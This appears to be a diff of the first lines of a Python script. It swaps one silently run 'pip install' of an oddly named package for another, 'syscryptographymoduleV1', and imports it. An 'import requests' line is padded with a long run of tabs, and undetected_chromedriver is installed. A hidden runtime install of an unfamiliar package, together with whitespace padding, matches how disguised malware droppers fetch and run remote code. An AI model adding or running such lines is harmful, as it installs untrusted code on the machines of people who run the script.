@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptlibrary")
-import syscryptlibrary
+os.system("pip install syscryptographymoduleV1")
+import syscryptographymoduleV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
